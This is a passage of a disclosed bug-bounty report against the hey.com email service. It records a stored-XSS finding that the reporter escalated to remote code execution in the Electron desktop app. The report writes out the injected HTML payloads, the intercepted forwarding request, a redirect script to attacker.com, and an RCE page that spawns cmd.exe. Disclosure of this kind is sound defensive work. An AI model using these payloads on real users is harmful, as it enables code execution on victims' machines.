{"id":988272,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODgyNzI=","url":"https://hackerone.com/reports/988272","title":"stored XSS in hey.com message content","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-09-22T15:31:43.955Z","submitted_at":"2020-09-22T15:31:44.005Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"carbon61","url":"/carbon61","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":67,"url":"https://hackerone.com/basecamp","handle":"basecamp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Basecamp","twitter_handle":"basecamp","website":"https://basecamp.com/about/policies/security/response","about":"Basecamp is the leading online project manager and the birthplace of Ruby on Rails."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-31T06:12:21.638Z","bug_reporter_agreed_on_going_public_at":"2020-10-31T06:12:21.572Z","team_member_agreed_on_going_public_at":"2020-10-31T01:27:23.798Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi \nI found a stored xss using ``` message[content] ``` parameter when forwarding an email or saving it as draft ,  and when the victim click on the email to view it, it gets executed .\n\nI used this payload as the message content :\n````\nFrom: \"f\" \u003c[]@hey.com\u003e\nTo: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com\nMessage-ID: \u003c3654584aa703ca2fd963856f8495669174ef673f@hey.com\u003e\nSubject: \u003cimg src=wczxzx onerror=alert(1)\u003e\nMime-Version: 1.0\n\n    \u003c/style\u003e\n    \u003c/div\u003e\n    \u003csvg\u003e\u003c![CDATA[\u003e\u003ctable background=\"]])\u003e\u003cimg src=xx:x onerror=alert(2)//\"\u003e\u003c/svg\u003e\n    \u003cli style=onesr: src= cxxc=\u003e\u003c/li\u003e\n    style\u003e\n\u003c/style\u003e\n  \u003c/head\u003e\n\u003cstyle\u003e\u003c/style\u003e\n  \u003cbody\u003e\n\n\u003csvg\u003e\u003c![CDATA[\u003e\u003cimage xlink: src=\"]]\u003e\u003cimg src=xx:x onerror=alert(2)//\"\u003e\u003c/svg\u003e\n\u003cli style=onerror:jkj/onerror=alert(1); =''ds\u003e\u003c/li\u003e\n    \u003c/div\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n#Note:\n i submitted this stored xss without the CSP bypass just to try not to get a duplicate , i will try to bypass the CSP and let you know.\n\n##Steps To Reproduce:\n1- make two accounts and login to the first one \n2- go to any email and forward it to the second email account and intercept the request and change it like this:\n```\nPOST /messages HTTP/1.1\nHost: app.hey.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\nAccept: text/html; page-update, text/html, application/xhtml+xml\nAccept-Language: ar,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://app.hey.com/entries/[]/forwards/new\nX-CSRF-Token: []\nContent-Type: multipart/form-data; boundary=---------------------------392581797716153644644274802600\nOrigin: https://app.hey.com\nContent-Length: 1156\nDNT: 1\nConnection: close\n\n\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\"acting_user_id\"\n\n{acting_user_id}\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\"entry[addressed][directly][]\"\n\n[second-email]@hey.com\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\"message[subject]\"\n\nFwd: csdc\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\"message[content]\"\n\nFrom: \"f\" \u003c[]@hey.com\u003e\nTo: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com\nMessage-ID: \u003c3654584aa703ca2fd963856f8495669174ef673f@hey.com\u003e\nSubject: \u003cimg src=wczxzx onerror=alert(1)\u003e\nMime-Version: 1.0\n\n    \u003c/style\u003e\n    \u003c/div\u003e\n    \u003csvg\u003e\u003c![CDATA[\u003e\u003ctable background=\"]])\u003e\u003cimg src=xx:x onerror=alert(2)//\"\u003e\u003c/svg\u003e\n    \u003cli style=onesr: src= cxxc=\u003e\u003c/li\u003e\n    style\u003e\n\u003c/style\u003e\n  \u003c/head\u003e\n\u003cstyle\u003e\u003c/style\u003e\n  \u003cbody\u003e\n\n\u003csvg\u003e\u003c![CDATA[\u003e\u003cimage xlink: src=\"]]\u003e\u003cimg src=xx:x onerror=alert(2)//\"\u003e\u003c/svg\u003e\n\u003cli style=onerror:jkj/onerror=alert(1); =''ds\u003e\u003c/li\u003e\n    \u003c/div\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\"_method\"\n\npost\n-----------------------------392581797716153644644274802600--\n\n```\n\n3- go to the second email ``` Imbox ``` and click on the email to view it \n4- use the right click on email content to get the devtools and if you view the chrome console you can see the \n```\nabout:blank:1 Refused to execute inline event handler\n because it violates the following Content Security Policy\n directive: \"script-src 'self' https://production.haystack-assets.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com\". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.\n```\n\n## Impact\n\nusing this xss + CSP bypass the attacker can steal data and perform unwanted actions on a victim's behalf.","vulnerability_information_html":"\u003cp\u003eHi \u003cbr\u003e\nI found a stored xss using \u003ccode\u003emessage[content]\u003c/code\u003e parameter when forwarding an email or saving it as draft ,  and when the victim click on the email to view it, it gets executed .\u003c/p\u003e\n\n\u003cp\u003eI used this payload as the message content :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eFrom: \u0026quot;f\u0026quot; \u0026lt;[]@hey.com\u0026gt;\nTo: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com\nMessage-ID: \u0026lt;3654584aa703ca2fd963856f8495669174ef673f@hey.com\u0026gt;\nSubject: \u0026lt;img src=wczxzx onerror=alert(1)\u0026gt;\nMime-Version: 1.0\n\n    \u0026lt;/style\u0026gt;\n    \u0026lt;/div\u0026gt;\n    \u0026lt;svg\u0026gt;\u0026lt;![CDATA[\u0026gt;\u0026lt;table background=\u0026quot;]])\u0026gt;\u0026lt;img src=xx:x onerror=alert(2)//\u0026quot;\u0026gt;\u0026lt;/svg\u0026gt;\n    \u0026lt;li style=onesr: src= cxxc=\u0026gt;\u0026lt;/li\u0026gt;\n    style\u0026gt;\n\u0026lt;/style\u0026gt;\n  \u0026lt;/head\u0026gt;\n\u0026lt;style\u0026gt;\u0026lt;/style\u0026gt;\n  \u0026lt;body\u0026gt;\n\n\u0026lt;svg\u0026gt;\u0026lt;![CDATA[\u0026gt;\u0026lt;image xlink: src=\u0026quot;]]\u0026gt;\u0026lt;img src=xx:x onerror=alert(2)//\u0026quot;\u0026gt;\u0026lt;/svg\u0026gt;\n\u0026lt;li style=onerror:jkj/onerror=alert(1); =\u0026#39;\u0026#39;ds\u0026gt;\u0026lt;/li\u0026gt;\n    \u0026lt;/div\u0026gt;\n  \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"note\"\u003eNote:\u003c/h1\u003e\n\n\u003cp\u003ei submitted this stored xss without the CSP bypass just to try not to get a duplicate , i will try to bypass the CSP and let you know.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003e1- make two accounts and login to the first one \u003cbr\u003e\n2- go to any email and forward it to the second email account and intercept the request and change it like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /messages HTTP/1.1\nHost: app.hey.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\nAccept: text/html; page-update, text/html, application/xhtml+xml\nAccept-Language: ar,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://app.hey.com/entries/[]/forwards/new\nX-CSRF-Token: []\nContent-Type: multipart/form-data; boundary=---------------------------392581797716153644644274802600\nOrigin: https://app.hey.com\nContent-Length: 1156\nDNT: 1\nConnection: close\n\n\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\u0026quot;acting_user_id\u0026quot;\n\n{acting_user_id}\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\u0026quot;entry[addressed][directly][]\u0026quot;\n\n[second-email]@hey.com\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\u0026quot;message[subject]\u0026quot;\n\nFwd: csdc\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\u0026quot;message[content]\u0026quot;\n\nFrom: \u0026quot;f\u0026quot; \u0026lt;[]@hey.com\u0026gt;\nTo: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com\nMessage-ID: \u0026lt;3654584aa703ca2fd963856f8495669174ef673f@hey.com\u0026gt;\nSubject: \u0026lt;img src=wczxzx onerror=alert(1)\u0026gt;\nMime-Version: 1.0\n\n    \u0026lt;/style\u0026gt;\n    \u0026lt;/div\u0026gt;\n    \u0026lt;svg\u0026gt;\u0026lt;![CDATA[\u0026gt;\u0026lt;table background=\u0026quot;]])\u0026gt;\u0026lt;img src=xx:x onerror=alert(2)//\u0026quot;\u0026gt;\u0026lt;/svg\u0026gt;\n    \u0026lt;li style=onesr: src= cxxc=\u0026gt;\u0026lt;/li\u0026gt;\n    style\u0026gt;\n\u0026lt;/style\u0026gt;\n  \u0026lt;/head\u0026gt;\n\u0026lt;style\u0026gt;\u0026lt;/style\u0026gt;\n  \u0026lt;body\u0026gt;\n\n\u0026lt;svg\u0026gt;\u0026lt;![CDATA[\u0026gt;\u0026lt;image xlink: src=\u0026quot;]]\u0026gt;\u0026lt;img src=xx:x onerror=alert(2)//\u0026quot;\u0026gt;\u0026lt;/svg\u0026gt;\n\u0026lt;li style=onerror:jkj/onerror=alert(1); =\u0026#39;\u0026#39;ds\u0026gt;\u0026lt;/li\u0026gt;\n    \u0026lt;/div\u0026gt;\n  \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n-----------------------------392581797716153644644274802600\nContent-Disposition: form-data; name=\u0026quot;_method\u0026quot;\n\npost\n-----------------------------392581797716153644644274802600--\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e3- go to the second email \u003ccode\u003eImbox\u003c/code\u003e and click on the email to view it \u003cbr\u003e\n4- use the right click on email content to get the devtools and if you view the chrome console you can see the \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eabout:blank:1 Refused to execute inline event handler\n because it violates the following Content Security Policy\n directive: \u0026quot;script-src \u0026#39;self\u0026#39; https://production.haystack-assets.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com\u0026quot;. Either the \u0026#39;unsafe-inline\u0026#39; keyword, a hash (\u0026#39;sha256-...\u0026#39;), or a nonce (\u0026#39;nonce-...\u0026#39;) is required to enable inline execution.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eusing this xss + CSP bypass the attacker can steal data and perform unwanted actions on a victim\u0026#39;s behalf.\u003c/p\u003e\n","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-11-30T01:27:23.870Z","allow_singular_disclosure_after":-2526656.020960216,"singular_disclosure_allowed":true,"vote_count":70,"voters":["everybodyhurts","namle","mygf","yrcrack","warlock_pro","1337ibrahim","naategh","yusuf_furkan","exploit_db","h4x0r-dz","and 60 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":53959,"asset_type":"URL","asset_identifier":"*.hey.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":9299472,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @carbon61,\n\nI’m afraid I can’t reproduce this. I get 404 errors for the images but no CSP error. Here’s the sanitized HTML that the server renders for me:\n\n```html\n\u003cdiv class=\"trix-content\"\u003e\n  From: \u0026quot;f\u0026quot; \u0026lt;[]@hey.com\u0026gt;\nTo: \u003ca href=\"mailto:dcdcsdcsdckhbdsckhb@kjbskjbcsd.com\"\u003edcdcsdcsdckhbdsckhb@kjbskjbcsd.com\u003c/a\u003e\nMessage-ID: \u0026lt;\u003ca href=\"mailto:3654584aa703ca2fd963856f8495669174ef673f@hey.com\"\u003e3654584aa703ca2fd963856f8495669174ef673f@hey.com\u003c/a\u003e\u0026gt;\nSubject: \u003cimg src=\"wczxzx\"\u003e\nMime-Version: 1.0\n\n    \n    \n    \u003c!--[CDATA[--\u003e\u003cli style=\"onesr:\" src=\"cxxc=\"\u003e\u003c/li\u003e\n    style\u0026gt;\n\u003csvg\u003e\u003c![CDATA[\u003e\u003cimage xlink: src=\"]]\u003e\u003cimg\u003e\n\u003cli style=\"onerror:jkj/onerror=alert(1);\"\u003e\u003c/li\u003e\n\n\u003c/svg\u003e\u003ctable background=\"]])\u0026gt;\u0026lt;img src=xx:x onerror=alert(2)//\"\u003e\n    \n  \n\u003cstyle\u003e\u003c/style\u003e\n  \n\n\u003c/table\u003e\u003c/div\u003e\n```\n\nIn any case, a CSP error isn’t evidence of a vulnerability. We’d need to see a successful CSP bypass leading to XSS.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/carbon61\"\u003e@carbon61\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI’m afraid I can’t reproduce this. I get 404 errors for the images but no CSP error. Here’s the sanitized HTML that the server renders for me:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;trix-content\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n  From: \u003cspan class=\"ni\"\u003e\u0026amp;quot;\u003c/span\u003ef\u003cspan class=\"ni\"\u003e\u0026amp;quot;\u003c/span\u003e \u003cspan class=\"ni\"\u003e\u0026amp;lt;\u003c/span\u003e[]@hey.com\u003cspan class=\"ni\"\u003e\u0026amp;gt;\u003c/span\u003e\nTo: \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;mailto:dcdcsdcsdckhbdsckhb@kjbskjbcsd.com\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003edcdcsdcsdckhbdsckhb@kjbskjbcsd.com\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\nMessage-ID: \u003cspan class=\"ni\"\u003e\u0026amp;lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;mailto:3654584aa703ca2fd963856f8495669174ef673f@hey.com\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e3654584aa703ca2fd963856f8495669174ef673f@hey.com\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\u003cspan class=\"ni\"\u003e\u0026amp;gt;\u003c/span\u003e\nSubject: \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;wczxzx\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\nMime-Version: 1.0\n\n\n\n    \u003cspan class=\"c\"\u003e\u0026lt;!--[CDATA[--\u0026gt;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;li\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;onesr:\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cxxc=\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/li\u0026gt;\u003c/span\u003e\n    style\u003cspan class=\"ni\"\u003e\u0026amp;gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;svg\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;![CDATA[\u0026gt;\u0026lt;image xlink: src=\u0026quot;]]\u0026gt;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;img\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;li\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;onerror:jkj/onerror=alert(1);\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/li\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u0026lt;table\u003c/span\u003e \u003cspan class=\"na\"\u003ebackground=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;]])\u0026amp;gt;\u0026amp;lt;img src=xx:x onerror=alert(2)//\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\n\n\u003cspan class=\"nt\"\u003e\u0026lt;style\u0026gt;\u0026lt;/style\u0026gt;\u003c/span\u003e\n\n\n\u003cspan class=\"nt\"\u003e\u0026lt;/table\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn any case, a CSP error isn’t evidence of a vulnerability. We’d need to see a successful CSP bypass leading to XSS.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-22T19:59:18.696Z","updated_at":"2020-09-22T19:59:18.696Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9299474,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-22T19:59:33.967Z","updated_at":"2020-09-22T19:59:33.967Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9486774,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @georgeclaghorn,\n\nsorry for the delay, while i wasn't able to bypass the csp beside just being able to call a js function without controlling the arguments using jsonp callback , after more testing i was able to get a RCE on the windows desktop app just by sending an email and if the victims open it the attacker gets a RCE on the machine.\n\n\nI start to look for open redirection on ``` app.hey.com ``` but i couldn't find one , and on the desktop app any url that is not ``` https://app.hey.com ``` will be opened in the external browser , i was able to bypass this using iframe and ``` sandbox=allow-top-navigation ``` and \n```\n\u003cscript\u003e\n\n  if (window.top != window.self) {\n    window.top.location = 'https://attacker.com/RCE.html';\n  }\n  \u003c/script\u003e\n  ```\n\nthis will redirect the main window to any location, but this window will has context isolation , i bypassed this by hosting the exploit html file on a different domain  for example if the iframe src is ``` localhost/redirect.html ``` the ``` window.top.location ``` will be ``` https://attacker.com/RCE.html ``` \n\nin the ``` RCE.html ``` i used this code to get the RCE by overriding the ``` Object.prototype.toString.call ``` :\n```\n\u003chtml\u003e\n \u003cbody\u003e\n  \u003cscript\u003e\n  Object.prototype.toString.call=function(process){ var Process = process.binding('process_wrap').Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+'='+env[key]);\nproc.spawn({file:'cmd.exe',args:['/k calc'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});}\n __SENTRY__.hub.run();\n  \u003c/script\u003e\n \u003c/body\u003e\n\u003c/html\u003e\n\n\n```\n\n## to reproduce this:\n\n1- create ``` localhost-or-[first-domain]/redirect.html  ``` like this:\n```\n\u003cscript\u003e\n\n  if (window.top != window.self) {\n    window.top.location = \"https://[your-other-domain]attacker.com/RCE.html\";\n    \n  \n  }\n  \u003c/script\u003e\n```\n\n2- on the other domain create RCE.html and put :\n```\n\u003chtml\u003e\n \u003cbody\u003e\n  \u003cscript\u003e\n  Object.prototype.toString.call=function(process){ var Process = process.binding('process_wrap').Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+'='+env[key]);\nproc.spawn({file:'cmd.exe',args:['/k calc'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});}\n __SENTRY__.hub.run();\n  \u003c/script\u003e\n \u003c/body\u003e\n\u003c/html\u003e\n\n\n```\n\n3- go to your first hey.com account and make a new message using this payload as the content and send it to another hey email that you own so you can verify the bug, use burpsuite to  intercept and inject the payload or using chrome right click and inspect to inject it in to the ``` \u003cinput type=\"hidden\" name=\"message[content]\" id=\"message_content__trix_input_message\" value='[payload-inject-here]'\u003e ``` directly:\n```\n\u003csvg\u003e\u003c![CDATA[\u003e\u003ctable background=\"]])\u003e\"\u003e\u003c/svg\u003e\n\u003csvg\u003e\u003c![CDATA[\u003e\u003ciframe src=\"//localhost-or-[first-domain]/redirect.html\" sandbox=\"allow-top-navigation allow-same-origin allow-scripts allow-popups allow-modals allow-forms allow-presentation allow-popups-to-escape-sandbox\"\u003e\u003c/iframe\u003e\u003csvg\u003e\n```\n\nNote: the ``` iframe src ``` should accept ``` https ``` requests . \n\n4- using the windows app login to the second account and click on the new message to view it \nif it worked you will see the ``` calc ``` app popup\n\nwhile I haven't test the mac and Linux apps if they are using electron js they are vulnerable too let me know if i should test them too.\nNote: this payload will not execute on the attackers account, only on the victims so to verify it you need to make 2 accounts.\n\nan attacker can exploit this in a large scale and in a way that a victim will never notice that his machine was hacked .\n\nlet me know if you need more info.\nRegards.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/georgeclaghorn\"\u003e@georgeclaghorn\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003esorry for the delay, while i wasn\u0026#39;t able to bypass the csp beside just being able to call a js function without controlling the arguments using jsonp callback , after more testing i was able to get a RCE on the windows desktop app just by sending an email and if the victims open it the attacker gets a RCE on the machine.\u003c/p\u003e\n\n\u003cp\u003eI start to look for open redirection on \u003ccode\u003eapp.hey.com\u003c/code\u003e but i couldn\u0026#39;t find one , and on the desktop app any url that is not \u003ccode\u003ehttps://app.hey.com\u003c/code\u003e will be opened in the external browser , i was able to bypass this using iframe and \u003ccode\u003esandbox=allow-top-navigation\u003c/code\u003e and \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\n\n  if (window.top != window.self) {\n    window.top.location = \u0026#39;https://attacker.com/RCE.html\u0026#39;;\n  }\n  \u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethis will redirect the main window to any location, but this window will has context isolation , i bypassed this by hosting the exploit html file on a different domain  for example if the iframe src is \u003ccode\u003elocalhost/redirect.html\u003c/code\u003e the \u003ccode\u003ewindow.top.location\u003c/code\u003e will be \u003ccode\u003ehttps://attacker.com/RCE.html\u003c/code\u003e \u003c/p\u003e\n\n\u003cp\u003ein the \u003ccode\u003eRCE.html\u003c/code\u003e i used this code to get the RCE by overriding the \u003ccode\u003eObject.prototype.toString.call\u003c/code\u003e :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nb\"\u003eObject\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprototype\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etoString\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecall\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eProcess\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebinding\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eprocess_wrap\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eProcess\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eproc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eProcess\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eproc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonexit\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{};\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eenv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eenv_\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[];\u003c/span\u003e\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ekey\u003c/span\u003e \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eenv_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan 